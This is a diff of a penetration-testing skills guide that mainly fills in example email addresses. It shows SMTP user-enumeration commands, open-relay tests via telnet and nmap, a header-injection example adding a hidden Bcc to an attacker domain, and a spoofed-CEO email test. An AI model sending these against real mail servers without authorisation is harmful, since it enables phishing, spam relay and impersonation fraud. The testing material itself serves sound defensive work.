@@ -1,4 +1,4 @@
-﻿# Security Consolidated Skills
+# Security Consolidated Skills
 
 ## 📋 Table of Contents
 
@@ -2987,7 +2987,7 @@ Payload: Numbers 1-1000
 ?orderId=456
 ?documentId=789
 ?file=report_123.pdf
-?account=[HIDDEN_EMAIL]
+?account=user@email.com
 ```
 
 ## Quick Reference
@@ -5194,16 +5194,16 @@ Key commands to test:
 ```bash
 # VRFY - Verify user exists
 VRFY admin
-250 2.1.5 [HIDDEN_EMAIL]
+250 2.1.5 admin@target.com
 
 # EXPN - Expand mailing list
 EXPN staff
-250 2.1.5 [HIDDEN_EMAIL]
-250 2.1.5 [HIDDEN_EMAIL]
+250 2.1.5 user1@target.com
+250 2.1.5 user2@target.com
 
 # RCPT TO - Recipient verification
-MAIL FROM:<[HIDDEN_EMAIL]>
-RCPT TO:<[HIDDEN_EMAIL]>
+MAIL FROM:<test@attacker.com>
+RCPT TO:<admin@target.com>
 # 250 OK = user exists
 # 550 = user doesn't exist
 ```
@@ -5257,8 +5257,8 @@ nmap -p 25 --script smtp-open-relay TARGET_IP
 # Manual testing via Telnet
 telnet TARGET_IP 25
 HELO attacker.com
-MAIL FROM:<[HIDDEN_EMAIL]>
-RCPT TO:<[HIDDEN_EMAIL]>
+MAIL FROM:<test@attacker.com>
+RCPT TO:<victim@external-domain.com>
 DATA
 Subject: Relay Test
 This is a test.
@@ -5282,11 +5282,11 @@ Test variations:
 # Test different sender/recipient combinations
 MAIL FROM:<>
 MAIL FROM:<test@[attacker_IP]>
-MAIL FROM:<[HIDDEN_EMAIL]>
+MAIL FROM:<test@target.com>
 
-RCPT TO:<[HIDDEN_EMAIL]>
-RCPT TO:<"[HIDDEN_EMAIL]">
-RCPT TO:<[HIDDEN_EMAIL]>
+RCPT TO:<test@external.com>
+RCPT TO:<"test@external.com">
+RCPT TO:<test%external.com@target.com>
 ```
 
 ### Phase 7: Brute Force Authentication
@@ -5330,11 +5330,11 @@ Test for command injection vulnerabilities:
 
 ```bash
 # Header injection test
-MAIL FROM:<[HIDDEN_EMAIL]>
-RCPT TO:<[HIDDEN_EMAIL]>
+MAIL FROM:<attacker@test.com>
+RCPT TO:<victim@target.com>
 DATA
 Subject: Test
-Bcc: [HIDDEN_EMAIL]
+Bcc: hidden@attacker.com
 X-Injected: malicious-header
 
 Injected content
@@ -5345,10 +5345,10 @@ Email spoofing test:
 
 ```bash
 # Spoofed sender (tests SPF/DKIM protection)
-MAIL FROM:<[HIDDEN_EMAIL]>
-RCPT TO:<[HIDDEN_EMAIL]>
+MAIL FROM:<ceo@target.com>
+RCPT TO:<employee@target.com>
 DATA
-From: CEO <[HIDDEN_EMAIL]>
+From: CEO <ceo@target.com>
 Subject: Urgent Request
 Please process this request immediately.
 .
@@ -5390,8 +5390,8 @@ dig TXT _dmarc.target.com                 # DMARC
 |---------|---------|---------|
 | HELO | Identify client | `HELO client.com` |
 | EHLO | Extended HELO | `EHLO client.com` |
-| MAIL FROM | Set sender | `MAIL FROM:<[HIDDEN_EMAIL]>` |
-| RCPT TO | Set recipient | `RCPT TO:<[HIDDEN_EMAIL]>` |
+| MAIL FROM | Set sender | `MAIL FROM:<sender@test.com>` |
+| RCPT TO | Set recipient | `RCPT TO:<user@target.com>` |
 | DATA | Start message body | `DATA` |
 | VRFY | Verify user | `VRFY admin` |
 | EXPN | Expand alias | `EXPN staff` |
@@ -5514,12 +5514,12 @@ run
 # Test via Telnet
 telnet mail.target.com 25
 HELO attacker.com
-MAIL FROM:<[HIDDEN_EMAIL]>
-RCPT TO:<[HIDDEN_EMAIL]>
+MAIL FROM:<test@attacker.com>
+RCPT TO:<test@gmail.com>
 # If 250 OK - VULNERABLE
 
 # Document with Nmap
-nmap -p 25 --script smtp-open-relay --script-args smtp-open-relay.from=[HIDDEN_EMAIL],smtp-open-relay.to=[HIDDEN_EMAIL] mail.target.com
+nmap -p 25 --script smtp-open-relay --script-args smtp-open-relay.from=test@attacker.com,smtp-open-relay.to=test@external.com mail.target.com
 
 # Output:
 # PORT   STATE SERVICE
@@ -8447,5 +8447,3 @@ Content-Security-Policy: script-src 'self' https://cdn.trusted.com
 - Sử dụng GitHub Actions để scan lỗ hổng tự động (SAST/DAST).
 - Scan image Docker với Trivy.
 - Kiểm tra tính tuân thủ (Compliance) tự động với OPA (Open Policy Agent).
-
-
